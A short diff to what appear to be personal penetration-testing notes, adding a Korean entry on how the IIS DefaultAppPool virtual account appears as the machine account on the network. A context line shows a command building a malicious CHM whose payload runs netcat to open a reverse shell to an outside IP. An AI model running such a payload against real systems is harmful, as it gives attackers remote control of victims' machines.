@@ -707,3 +707,14 @@ Out-CHM -Payload "c:\users\chris\downloads\nc.exe 10.10.14.22 4444 -e cmd.exe" -
 ```
 
 </details>
+
+---
+<details>
+ <summary><strong>IIS APPPOOL\DefaultAppPool</strong></summary>
+
+- Microsoft Virtual Account의 특징.
+- 로컬에서는 가상 계정으로, 네트워크에서는 머신 계정으로 바뀜.
+<img width="1202" height="85" alt="image" src="https://github.com/user-attachments/assets/4b1b4c79-5e65-4f0f-84f9-eb779dbce67d" />
+<img width="1202" height="180" alt="image" src="https://github.com/user-attachments/assets/85ddee70-f086-41d8-a67d-2fe29b1fd8d5" />
+
+</details>
